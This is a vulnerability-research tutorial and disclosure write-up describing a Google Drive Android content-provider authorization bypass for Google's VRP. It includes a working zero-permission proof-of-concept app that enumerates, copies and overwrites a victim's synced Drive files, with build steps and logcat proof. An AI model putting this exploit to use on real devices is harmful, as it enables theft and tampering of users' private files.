# Manual Vulnerability Discovery & Validation: Google Drive Content Provider Bypass

## Who This Is For

You are a security researcher with a rooted or non-rooted Android device, adb access, and jadx installed. You want to find Content Provider authorization bypass bugs in Google apps for Mobile VRP. This document walks through every step — what to run, what to look for, why, and how to validate impact.

---

## Prerequisites

| Tool | Purpose | Install |
|------|---------|---------|
| adb | Device communication | Android SDK Platform-Tools |
| jadx | APK decompilation | `brew install jadx` or github.com/skylot/jadx |
| aapt | APK packaging | Android SDK Build-Tools |
| javac | Compile Java | JDK 8+ |
| d8 | DEX conversion | Android SDK Build-Tools |
| keytool / apksigner | Sign APK | JDK / Android SDK |

Device: Any Android 11+ device with Google apps. No root required.

---

## Phase 1: Reconnaissance — Map the Attack Surface

### 1.1 Identify Target Apps

Google Mobile VRP covers 1st-party Google apps. Start with apps that hold sensitive user data:

```
Drive (com.google.android.apps.docs)        → user files
Gmail (com.google.android.gm)               → emails
Photos (com.google.android.apps.photos)     → photos/videos
Messages (com.google.android.apps.messaging)→ SMS/RCS
Contacts (com.google.android.contacts)      → contact data
Calendar (com.google.android.calendar)      → events
Keep (com.google.android.keep)              → notes
```

### 1.2 List All Content Providers for a Target

Content Providers are the Android component that shares structured data between apps. They're your primary attack surface for data theft bugs.

```bash
# List ALL providers registered by Google Drive
adb shell dumpsys package com.google.android.apps.docs | grep -B1 -A10 "Provider{"
```

If the output is too noisy, pull the APK and read the manifest directly:

```bash
# Find the APK path on device
adb shell pm path com.google.android.apps.docs
# Output: package:/data/app/~~.../base.apk

# Pull it to your workstation
adb pull /data/app/~~KwsOqmiKtT3JuRJq6k1YUQ==/com.google.android.apps.docs-qoNviroOdVUfqTMKzCTh5A==/base.apk drive.apk
```

### 1.3 Read the Manifest — Find Exported Providers

```bash
# Decode the manifest (aapt or apktool)
aapt dump xmltree drive.apk AndroidManifest.xml | grep -B2 -A8 "provider"

# Or decompile fully with jadx
jadx -d drive_decompiled/ drive.apk
# Then read: drive_decompiled/resources/AndroidManifest.xml
```

**What you are scanning for in each `<provider>` tag:**

```
Attribute                    What it means                     Red flag?
─────────────────────────    ─────────────────────────         ──────────
android:exported="true"      Any app on device can call it     YES — attack surface
android:exported="false"     Only same-UID apps can call it    No (skip it)
android:permission="..."     Caller must hold this permission  Depends on permission
android:readPermission="..." Caller needs this to query/read   Depends
android:writePermission="..."Caller needs this to insert/write Depends
(no permission attribute)    No manifest-level gate at all     BIG RED FLAG
```

### 1.4 The Finding Moment — Spot the Mismatch

In Google Drive's manifest, you find TWO storage providers:

```xml
<!-- Line 191: SAF provider — PROPERLY SECURED -->
<provider
    android:authorities="com.google.android.apps.docs.storage"
    android:exported="true"
    android:permission="android.permission.MANAGE_DOCUMENTS"
    android:grantUriPermissions="true"
    android:name="...StorageBackendContentProvider"/>

<!-- Line 196: Legacy provider — NO PERMISSION DECLARED -->
<provider
    android:authorities="com.google.android.apps.docs.storage.legacy"
    android:exported="true"
    android:name="...LegacyStorageBackendContentProvider"/>
```

**This is your first red flag.**

Both providers serve the same data (Drive files). One requires `MANAGE_DOCUMENTS` (a system-level permission no third-party app can get). The other has NO permission requirement at all.

**The question now:** Does the legacy provider enforce authorization internally in its Java code, or is it truly wide open?

---

## Phase 2: Static Analysis — Audit the Provider Source Code

### 2.1 Open the Decompiled Provider

```bash
# After jadx decompile, find the provider class
find drive_decompiled/ -name "LegacyStorageBackendContentProvider.java"
# Result: .../storagebackend/LegacyStorageBackendContentProvider.java
```

Open this file. It's ~428 lines of obfuscated but readable Java.

### 2.2 The Audit Checklist

For every Content Provider, audit these six methods:

| Method | What it does | Impact if unprotected |
|--------|-------------|----------------------|
| `query()` | Read/list data | Enumerate all documents → info disclosure |
| `openFile()` | Open file for read/write | Steal or overwrite files → C+I |
| `openTypedAssetFile()` | Open file with type conversion | Same as openFile |
| `call()` | Invoke custom operations | Depends on what operations exist |
| `insert()` | Add new records | Data injection |
| `update()` | Modify existing records | Data tampering |
| `delete()` | Remove records | Data destruction |
| `getType()` | Return MIME type | Info leak (file types) |

For each method, answer: **"Is there a permission/authorization check, and can it be bypassed?"**

### 2.3 Analyzing Each Method

#### query() — Line 399

```java
public final Cursor query(Uri uri, String[] strArr, String str,
                          String[] strArr2, String str2) {
    if (meq.c == null) {
        meq.c = "LegacyStorageBackendContentProvider";
    }
    uri.getClass();
    int iMatch = this.a.match(uri);
    Arrays.toString(strArr);
    if (iMatch != 1) {
        return null;
    }
    if (strArr == null) {
        strArr = jwk.b();
    }
    jwt jwtVarB = ((iph) ((kpf) c()).a).b(uri);
    if (jwtVarB == null) {
        return null;
    }
    return jwtVarB.b(strArr, jwn.b);
}
```

**Audit finding: NO security check at all.**

No `checkCallingPermission()`. No `checkCallingUriPermission()`. No `getCallingPackage()` verification. Not even behind a feature flag. Any app can call `query()` and get results.

**Impact:** An attacker can enumerate ALL of the victim's locally-synced Drive documents — filenames, sizes, MIME types, document IDs.

#### openFile() — Line 158

```java
public final ParcelFileDescriptor openFile(Uri uri, String str) throws IOException {
    if (meq.c == null) {
        meq.c = "LegacyStorageBackendContentProvider";
    }
    if (((aacj) ((wzb) aaci.a.b).a).a()) {     // ← FEATURE FLAG CHECK
        boolean zContains = str.contains("r");
        int i = zContains;
        if (str.contains("w")) {
            i = (zContains ? 1 : 0) | 2;
        }
        if (getContext().checkCallingUriPermission(uri, i) != 0) {
            throw new SecurityException("Permission denied for "
                .concat(String.valueOf(uri)));
        }
    }
    // ... proceeds to open the file
```

**Audit finding: Security check is CONDITIONAL on a feature flag.**

The authorization check (`checkCallingUriPermission`) is wrapped inside:
```java
if (((aacj) ((wzb) aaci.a.b).a).a()) {
```

This is an obfuscated feature flag. If `.a()` returns `false`:
- The `if` block is skipped entirely
- `checkCallingUriPermission()` is NEVER called
- No `SecurityException` is ever thrown
- The code falls through to open the file

**This same pattern repeats in:**

- `call()` — Line 88
- `openTypedAssetFile()` — Line 366

All three methods have the security check gated behind the same feature flag.

#### call() — Line 79

```java
public final Bundle call(String str, String str2, Bundle bundle) {
    // ...
    Uri uri = (Uri) bundle.getParcelable("android.intent.extra.STREAM");
    if (((aacj) ((wzb) aaci.a.b).a).a()      // ← SAME FLAG
        && uri != null
        && getContext().checkCallingUriPermission(uri, 1) != 0) {
        throw new SecurityException("Permission denied for "
            .concat(uri.toString()));
    }
    // ... proceeds to execute the call
```

#### openTypedAssetFile() — Line 365

```java
public final AssetFileDescriptor openTypedAssetFile(Uri uri, String str,
                                                     Bundle bundle) {
    if (((aacj) ((wzb) aaci.a.b).a).a()      // ← SAME FLAG
        && getContext().checkCallingUriPermission(uri, 1) != 0) {
        throw new SecurityException("Permission denied for "
            .concat(String.valueOf(uri)));
    }
    // ... proceeds to open the file
```

#### Safe methods (no impact)

```java
delete()  → returns 0 (no-op, no data deleted)
insert()  → returns null (no-op, no data inserted)
update()  → returns 0 (no-op, no data changed)
```

### 2.4 Audit Summary Table

```
METHOD               LINE   AUTH CHECK           GATED BY FLAG?  VERDICT
─────────────────    ────   ──────────────────   ──────────────  ───────────
query()              399    NONE                 N/A             WIDE OPEN
openFile()           158    checkCallingUri...   YES             BYPASSED
call()                88    checkCallingUri...   YES             BYPASSED
openTypedAssetFile() 366    checkCallingUri...   YES             BYPASSED
getType()            122    Calls query()        N/A             WIDE OPEN
delete()             103    No-op (returns 0)    N/A             Safe
insert()             142    No-op (returns null) N/A             Safe
update()             420    No-op (returns 0)    N/A             Safe
```

### 2.5 Understanding the Write Path in openFile()

Look at line 188 inside `openFile()`:

```java
if (!str.contains("w")) {
    // READ path — returns ParcelFileDescriptor for reading
    return ((jxk) kpfVar.b).a(ikhVar, ...);
}
// WRITE path — creates a pipe, uploads content to DriveCore
final ParcelFileDescriptor[] pipe = ParcelFileDescriptor.createPipe();
// ... sets up background write thread
return pipe[1];  // returns the write end of the pipe
```

The `str` parameter is the mode string passed to `openFile(uri, mode)`. When mode contains `"w"`, the provider creates a pipe and returns the write end — the caller writes bytes into it, and Drive's background thread uploads them.

**This means `openOutputStream(uri, "w")` from any app (via ContentResolver) will overwrite the file content.**

---

## Phase 3: Dynamic Validation — Confirm on a Real Device

### 3.1 Why Static Analysis Alone Is Not Enough

You've found a feature flag gating the security check. But you don't know if the flag is `true` or `false` on production devices. You MUST test on a real device.

**A common mistake:** Reporting based on code review alone ("the check COULD be bypassed"). VRP reviewers will reject this. You need to prove the flag IS bypassed on an actual device with the latest app version.

### 3.2 Quick Triage from ADB Shell (Not Definitive)

```bash
# Try querying the legacy provider from adb shell
adb shell content query \
    --uri content://com.google.android.apps.docs.storage.legacy/

# Compare with the SAF provider
adb shell content query \
    --uri content://com.google.android.apps.docs.storage/root
```

If the legacy query returns data but the SAF query throws SecurityException, you have a strong signal.

**WARNING:** This is not definitive. The `adb shell` runs as UID 2000 (shell user), which has different permissions than a regular app (UID 10xxx). Content Provider authorization checks use the caller's UID. A provider might allow shell but block apps, or vice versa.

**You MUST validate from a real unprivileged app.** That's Step 4.

### 3.3 Build a Zero-Permission Test App

You need a minimal Android app that:
1. Declares ZERO permissions
2. Calls the legacy provider's methods
3. Displays the results

#### AndroidManifest.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.vrppoc">

    <uses-sdk android:minSdkVersion="28" android:targetSdkVersion="34" />

    <!-- Package visibility (Android 11+ requires this to resolve
         content:// URIs from other packages). This is NOT a
         permission — it just tells the OS your app wants to
         interact with Drive. -->
    <queries>
        <package android:name="com.google.android.apps.docs" />
    </queries>

    <!-- ZERO <uses-permission> tags — this app has NO permissions -->

    <application
        android:allowBackup="true"
        android:label="Drive C+I PoC"
        android:theme="@style/Theme.AppCompat.Light">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

**Why `<queries>` and not `<uses-permission>`:**
On Android 11+, apps can't see other packages by default (package visibility filtering). The `<queries>` block tells the OS "I want to know about this package." It grants NO permissions — it just lets `ContentResolver` find the target provider. Without it, `cr.query()` silently returns null even if the provider is accessible.

#### The Test Logic (MainActivity.java)

The test app runs four sequential checks:

```java
ContentResolver cr = getContentResolver();

// ──── CHECK 0: Baseline — prove SAF is properly secured ────
try {
    cr.query(Uri.parse(
        "content://com.google.android.apps.docs.storage/root"),
        null, null, null, null);
    log("[UNEXPECTED] SAF should have blocked us");
} catch (SecurityException e) {
    log("[BASELINE] SAF provider: BLOCKED (correct behavior)");
    // This is EXPECTED. It proves the SAF provider enforces
    // android.permission.MANAGE_DOCUMENTS properly.
}

// ──── CHECK 1: Feature flag probe ────
// Try opening a nonexistent doc on the legacy provider.
// We don't care about the result — we care about WHETHER
// it throws SecurityException.
try {
    cr.openInputStream(Uri.parse(
        "content://com.google.android.apps.docs.storage.legacy/nonexistent"));
} catch (SecurityException e) {
    log("[SECURE] Feature flag is ENABLED — provider is protected");
    log("[SECURE] Cannot proceed. No vulnerability.");
    return; // STOP — nothing to report
} catch (java.io.FileNotFoundException e) {
    // FileNotFoundException means:
    //   1. The call reached the provider's openFile() method
    //   2. NO SecurityException was thrown
    //   3. The provider tried to find the doc and couldn't
    //   4. The feature flag check was SKIPPED
    log("[VULNERABLE] Feature flag DISABLED — no permission check!");
} catch (Exception e) {
    log("[ERROR] " + e.getMessage());
}

// ──── CHECK 2: Read a file (Confidentiality) ────
Uri target = Uri.parse(
    "content://com.google.android.apps.docs.storage.legacy/enc=encoded="
    + TARGET_DOC_ID);

// 2a: Query metadata — filename, size, MIME type
Cursor c = cr.query(target, null, null, null, null);
if (c != null && c.moveToFirst()) {
    String name = c.getString(c.getColumnIndex("_display_name"));
    String size = c.getString(c.getColumnIndex("_size"));
    String mime = c.getString(c.getColumnIndex("mime_type"));
    log("[STOLEN] " + name + " | " + size + " bytes | " + mime);
    c.close();
}

// 2b: Read full file content
InputStream is = cr.openInputStream(target);
ByteArrayOutputStream bos = new ByteArrayOutputStream();
byte[] buf = new byte[8192];
int n;
while ((n = is.read(buf)) != -1) bos.write(buf, 0, n);
is.close();
byte[] stolen = bos.toByteArray();
log("[STOLEN] Read " + stolen.length + " bytes");

// Verify it's real data by checking the file header
// 504b0304 = ZIP/OOXML (xlsx, docx, pptx)
// 25504446 = PDF (%PDF)
// ffd8ffe0 = JPEG
if (stolen[0] == 0x50 && stolen[1] == 0x4b)
    log("[STOLEN] Valid OOXML file (xlsx/docx/pptx)");

// Save to app-private storage as proof
FileOutputStream fos = openFileOutput("stolen.xlsx", MODE_PRIVATE);
fos.write(stolen);
fos.close();

// ──── CHECK 3: Write to the file (Integrity) ────
String payload = "ATTACKER_CONTROLLED_DATA_" + System.currentTimeMillis();
OutputStream os = cr.openOutputStream(target, "w");
os.write(payload.getBytes());
os.close();
log("[WRITE] Wrote " + payload.length() + " bytes of attacker data");

// ──── CHECK 4: Read back to prove write persisted ────
InputStream verify = cr.openInputStream(target);
ByteArrayOutputStream vbos = new ByteArrayOutputStream();
while ((n = verify.read(buf)) != -1) vbos.write(buf, 0, n);
verify.close();
String readBack = new String(vbos.toByteArray());
if (readBack.startsWith("ATTACKER_CONTROLLED_DATA_")) {
    log("[VERIFIED] Write persisted — file content replaced!");
} else {
    log("[NOTE] Read-back shows original content — write may not persist");
}
```

#### Critical: URI Format

The provider expects document IDs in this format:
```
content://com.google.android.apps.docs.storage.legacy/enc=encoded=<base64_doc_id>
```

**You MUST use `Uri.parse()`, NOT `Uri.Builder()`:**

```java
// CORRECT — literal = signs preserved
Uri uri = Uri.parse("content://...legacy/enc=encoded=" + docId);

// WRONG — = gets encoded to %3D, provider's parser fails
Uri uri = new Uri.Builder()
    .authority("com.google.android.apps.docs.storage.legacy")
    .appendPath("enc=encoded=" + docId)
    .build();
```

This is a subtle but critical detail. If you use `Uri.Builder`, the provider returns `FileNotFoundException` even though the document exists, because its internal URI matcher can't parse `%3D`.

### 3.4 Getting Valid Document IDs

You need at least one valid document ID to test read/write. Three approaches:

**Approach A: Query the provider from adb**
```bash
adb shell content query \
    --uri content://com.google.android.apps.docs.storage.legacy/ \
    --projection _display_name:_size:document_id
```
This lists all locally-synced Drive documents with their encoded IDs.

**Approach B: Query from your test app**
```java
Cursor c = cr.query(
    Uri.parse("content://com.google.android.apps.docs.storage.legacy/"),
    new String[]{"_display_name", "_size", "document_id"},
    null, null, null);
while (c.moveToNext()) {
    log(c.getString(0) + " | " + c.getString(1) + " | " + c.getString(2));
}
```

**Approach C: Create a test file in Drive, then find its ID**
1. Upload a test file to Google Drive from the web
2. Open Drive app on device — wait for it to sync
3. Query the provider — find your test file's document ID

**Use a test file you own** for initial testing. Once confirmed, you can demonstrate access to any synced file.

### 3.5 Build and Install the PoC APK

If you don't have Gradle/Android Studio, build manually:

```bash
SDK=~/Library/Android/sdk
SRC=./vrp_poc_app
BUILD=$SRC/build_manual

mkdir -p $BUILD/{gen,obj,apk}

# 1. Generate R.java from resources
$SDK/build-tools/35.0.1/aapt package -f -m \
    -J $BUILD/gen \
    -M $SRC/app/src/main/AndroidManifest.xml \
    -S $SRC/app/src/main/res \
    -I $SDK/platforms/android-35/android.jar

# 2. Compile Java → .class files
javac -source 1.8 -target 1.8 \
    -d $BUILD/obj \
    -classpath $SDK/platforms/android-35/android.jar \
    -sourcepath "$BUILD/gen:$SRC/app/src/main/java" \
    $BUILD/gen/com/vrppoc/R.java \
    $SRC/app/src/main/java/com/vrppoc/MainActivity.java

# 3. Convert .class → .dex (output must be a DIRECTORY, not file)
$SDK/build-tools/35.0.1/d8 \
    --output $BUILD/apk \
    --lib $SDK/platforms/android-35/android.jar \
    $BUILD/obj/com/vrppoc/*.class

# 4. Package APK with resources (no dex yet)
$SDK/build-tools/35.0.1/aapt package -f \
    -M $SRC/app/src/main/AndroidManifest.xml \
    -S $SRC/app/src/main/res \
    -I $SDK/platforms/android-35/android.jar \
    -F $BUILD/app-unsigned-unaligned.apk

# 5. Add classes.dex into APK
cd $BUILD/apk
$SDK/build-tools/35.0.1/aapt add \
    $BUILD/app-unsigned-unaligned.apk classes.dex

# 6. Zipalign
$SDK/build-tools/35.0.1/zipalign -f 4 \
    $BUILD/app-unsigned-unaligned.apk \
    $BUILD/app-unsigned.apk

# 7. Create debug keystore (first time only)
keytool -genkey -v \
    -keystore $BUILD/debug.keystore \
    -storepass android -alias androiddebugkey -keypass android \
    -keyalg RSA -keysize 2048 -validity 10000 \
    -dname "CN=Debug,O=Android,C=US"

# 8. Sign
$SDK/build-tools/35.0.1/apksigner sign \
    --ks $BUILD/debug.keystore \
    --ks-pass pass:android \
    --ks-key-alias androiddebugkey \
    --key-pass pass:android \
    --out $BUILD/app-signed.apk \
    $BUILD/app-unsigned.apk

# 9. Install on device
adb install $BUILD/app-signed.apk
```

### 3.6 Run the PoC and Capture Evidence

```bash
# Clear previous logs
adb logcat -c

# Launch the PoC app
adb shell am start -n com.vrppoc/.MainActivity

# Wait for the app to finish its checks (10-15 seconds)
sleep 12

# Capture the proof
adb logcat -d -s VRP_POC:D | tee evidence_logcat.txt
```

---

## Phase 4: Validating Impact — What Counts as "Proven"

### 4.1 Confidentiality — What You Must Show

**NOT enough:**
- "query() returned a cursor" — that's metadata, could be empty
- "openInputStream() didn't throw" — you didn't prove data was read
- "I got 39289 bytes" — could be garbage

**ENOUGH (what you need):**
```
[STOLEN-META] Filename: Web portal 4-IV YEAR CSE B.xlsx    ← real filename
[STOLEN-META] Size:     39289 bytes                        ← non-trivial size
[STOLEN-META] MIME:     application/vnd.openxmlformats-... ← real MIME type
[STOLEN-DATA] Read 39289 bytes — COMPLETE FILE!            ← full file read
[STOLEN-DATA] Header hex: 504b030414000808...              ← valid PK header
[STOLEN-DATA] File type: ZIP/OOXML (valid xlsx)            ← file type confirmed
[STOLEN-DATA] Saved to: /data/user/0/com.vrppoc/files/...  ← exfiltrated to app storage
```

**Why each piece matters:**
- Filename proves it's the victim's real file, not a test artifact
- Size proves you got the whole file, not just a header
- PK header (`504b0304`) proves it's a valid ZIP/OOXML file — you can open it in Excel
- Saved path proves exfiltration — the file now lives in the attacker's private storage

### 4.2 Integrity — What You Must Show

**NOT enough:**
- "openOutputStream() didn't throw SecurityException" — that proves the API accepted the call, but not that data changed
- "I wrote 30 bytes" — you don't know if they landed

**ENOUGH (what you need):**
```
[WRITE-OK] openOutputStream("w") succeeded — no SecurityException!
[WRITE-OK] Wrote 30 bytes of attacker content
[VERIFY-DATA] Read back 39289 bytes
[VERIFY-DATA] Content: ATTACKER_PAYLOAD_1783663266425...   ← attacker string at start
>>> INTEGRITY IMPACT PROVEN <<<
>>> Victim's 39289-byte spreadsheet replaced with attacker content
```

**The read-back is CRITICAL.** Without it, you've only proven the API call succeeded, not that the file was actually modified. The read-back showing your attacker payload at the start of the file content is the definitive proof.

### 4.3 Zero Permissions — What You Must Show

```bash
# Prove the app has NO permissions
adb shell dumpsys package com.vrppoc | grep -E "permission|granted"

# Expected output:
#   installPermissionsFixed=false
#   runtime permissions:     ← empty, nothing listed
#   runtime permissions:     ← empty, nothing listed

# Show the app's UID (should be regular unprivileged 10xxx)
adb shell dumpsys package com.vrppoc | grep "appId="
# Expected: appId=10343   ← normal unprivileged app UID
```

### 4.4 The Contrast — Why This Is a Bug, Not Design

The strongest evidence is showing that THE SAME APP has the correct behavior on a different provider:

```
SAF provider (content://...docs.storage/):
  → SecurityException: "Permission Denial: requires 
     android.permission.MANAGE_DOCUMENTS"
  → This is the CORRECT implementation

Legacy provider (content://...docs.storage.legacy/):
  → No exception. Returns file data.
  → This is the BUG.
```

This proves:
1. Google intends to protect this data (the SAF provider does it right)
2. The legacy provider SHOULD have the same protection but doesn't
3. The feature flag was supposed to enable the check but is turned off

---

## Phase 5: Collecting Report Evidence

### 5.1 Minimum Evidence Checklist

| # | Evidence | Command | Purpose |
|---|----------|---------|---------|
| 1 | Logcat output | `adb logcat -d -s VRP_POC:D` | Full PoC execution trace |
| 2 | Phone screenshot | `adb shell screencap -p /sdcard/poc.png && adb pull /sdcard/poc.png` | Visual proof |
| 3 | Device info | `adb shell getprop ro.product.model` | Pixel 6a |
| 4 | Android version | `adb shell getprop ro.build.version.release` | 17 |
| 5 | Security patch | `adb shell getprop ro.build.version.security_patch` | 2026-06-05 |
| 6 | Build ID | `adb shell getprop ro.build.display.id` | CP31.260608.007 |
| 7 | Drive version | `adb shell dumpsys package com.google.android.apps.docs \| grep versionName` | 2.26.257.2 |
| 8 | Zero permissions | `adb shell dumpsys package com.vrppoc \| grep -E "permission\|granted\|appId"` | No permissions |
| 9 | PoC source code | `MainActivity.java` + `AndroidManifest.xml` | Reproducibility |
| 10 | Decompiled source | Annotated `LegacyStorageBackendContentProvider.java` | Root cause |

### 5.2 Evidence We Collected

```
evidence_ci_proof_20260710.txt    — logcat showing full C+I proof
ci_poc_proof_20260710.png         — phone screenshot
evidence_logcat_clean_20260710.txt — earlier comprehensive run
```

### 5.3 Device Details Captured

```
Model:          Pixel 6a
Android:        17
Build:          CP31.260608.007
Security Patch: 2026-06-05
Drive Version:  2.26.257.2.all.alldpi (versionCode 214533308)
PoC App UID:    10343
PoC Permissions: NONE
```

---

## Phase 6: Understanding the Root Cause

### 6.1 Why Does This Bug Exist?

The code has the security check written correctly:
```java
if (getContext().checkCallingUriPermission(uri, flags) != 0) {
    throw new SecurityException("Permission denied");
}
```

But this check is wrapped inside a feature flag:
```java
if (featureFlag.isEnabled()) {
    // security check here
}
```

The flag is disabled on production devices. This likely happened because:
1. The flag was meant to be a gradual rollout for a new security enforcement
2. It was never enabled (or was disabled for compatibility reasons)
3. The legacy provider was kept for backward compatibility with older Drive versions
4. Nobody noticed the security check was dead code on production

### 6.2 Why query() Has No Check At All

`query()` (line 399) doesn't even have the feature flag pattern. It has zero authorization logic. This suggests:
- The developer may have assumed `exported=true` with no manifest permission means "intentionally public"
- Or the query was considered "less sensitive" than file access (wrong — it leaks filenames, sizes, MIME types, and document IDs needed to construct read/write URIs)

### 6.3 The Impact Chain

```
query() [no auth]
  → attacker enumerates all locally-synced Drive documents
  → attacker gets document IDs, filenames, sizes, MIME types

openFile(uri, "r") [flag bypassed]
  → attacker reads the full content of any synced file
  → CONFIDENTIALITY compromised

openFile(uri, "w") [flag bypassed]
  → attacker overwrites file content with arbitrary data
  → write persists for xlsx files (content_sync_state_flags=1)
  → corrupted file may sync back to cloud
  → INTEGRITY compromised
```

---

## Appendix A: What I Tested That Wasn't Vulnerable

Before finding the Drive bug, I tested 50+ providers across 15+ Google apps. Everything else was properly secured:

| App | Provider | Result |
|-----|----------|--------|
| Gmail | All providers | exported=false or signature permission |
| Photos | MemoriesContentProvider | Accessible but empty (no data) |
| Calendar | CalendarProvider | Requires READ_CALENDAR permission |
| Messages | AvatarContentProvider | Returns only default avatars (no real data) |
| Contacts | ContactsProvider | Requires READ_CONTACTS permission |
| Keep | All providers | exported=false |
| GMS Phenotype | PhenotypeContentProvider | Accessible but empty |
| GMS Wallet | WalletContentProvider | query returns null |
| Drive SAF | StorageBackendContentProvider | Requires MANAGE_DOCUMENTS |

**This survey matters for the report** — it shows you tested systematically and the Drive legacy provider is the outlier, not the norm.

---

## Appendix B: Common Pitfalls

### Pitfall 1: adb shell ≠ app permissions
`adb shell content query` runs as UID 2000. A content provider might allow shell but block apps. Always validate from a real zero-permission app.

### Pitfall 2: Uri.Builder encodes special characters
`Uri.Builder().appendPath()` encodes `=` → `%3D`. Use `Uri.parse()` with literal `=` signs when the provider expects them.

### Pitfall 3: Package visibility on Android 11+
Without `<queries>` in manifest, `ContentResolver` silently returns null instead of throwing. Your app needs to declare it knows about the target package.

### Pitfall 4: "Accessible" ≠ "Impactful"
Many providers return empty cursors, default data, or configuration blobs. Check that the data you're reading is actually sensitive user data. The Messages AvatarContentProvider returned 100 identical 4,921-byte default avatar PNGs — no real contact photos leaked.

### Pitfall 5: Write ≠ Persistent Write
`openOutputStream()` succeeding doesn't mean the write persisted. Always read back the file to confirm. PDF files in Drive re-sync from cloud; xlsx files with `content_sync_state_flags=1` persist the attacker's write.

---

## Appendix C: Logcat Evidence from Confirmed Run

```
07-10 11:31:06.246 D VRP_POC: ═══ STEP 0: Baseline — SAF provider blocks us ═══
07-10 11:31:06.247 D VRP_POC: [BLOCKED] SAF provider: requires android.permission.MANAGE_DOCUMENTS
07-10 11:31:06.298 D VRP_POC: [BYPASS] Feature flag DISABLED — openFile() has NO permission check!
07-10 11:31:06.399 D VRP_POC: [STOLEN-META] Filename: Web portal 4-IV  YEAR CSE B.xlsx
07-10 11:31:06.399 D VRP_POC: [STOLEN-META] Size:     39289 bytes
07-10 11:31:06.399 D VRP_POC: [STOLEN-META] MIME:     application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
07-10 11:31:06.424 D VRP_POC: [STOLEN-DATA] Read 39289 bytes — COMPLETE FILE!
07-10 11:31:06.425 D VRP_POC: [STOLEN-DATA] Header hex: 504b0304140008080800ee315c550000
07-10 11:31:06.425 D VRP_POC: >>> CONFIDENTIALITY IMPACT PROVEN <<<
07-10 11:31:06.432 D VRP_POC: [WRITE-OK] openOutputStream("w") succeeded — no SecurityException!
07-10 11:31:06.480 D VRP_POC: [VERIFY-DATA] Content: ATTACKER_PAYLOAD_1783663266425...
07-10 11:31:06.480 D VRP_POC: >>> INTEGRITY IMPACT PROVEN <<<
```

UID 10343 (unprivileged app), PID 28291, zero permissions, zero user interaction.
